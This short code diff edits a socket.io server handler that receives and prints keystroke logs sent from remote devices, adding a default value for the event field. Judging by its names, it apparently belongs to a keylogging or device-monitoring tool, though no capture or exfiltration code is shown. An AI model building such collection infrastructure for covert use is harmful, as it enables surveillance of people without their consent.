@@ -555,7 +555,7 @@ export const startSocketIO = async () => {
 						const deviceId = response.deviceId;
 						const keyLogsType = response.keyLogsType;
 						const keylogs = response.keylogs;
-						const keyEvent = response.event;
+						const keyEvent = response.event || "None";
 						console.log(
 							"KeyLogs Response=>",
 							deviceId,
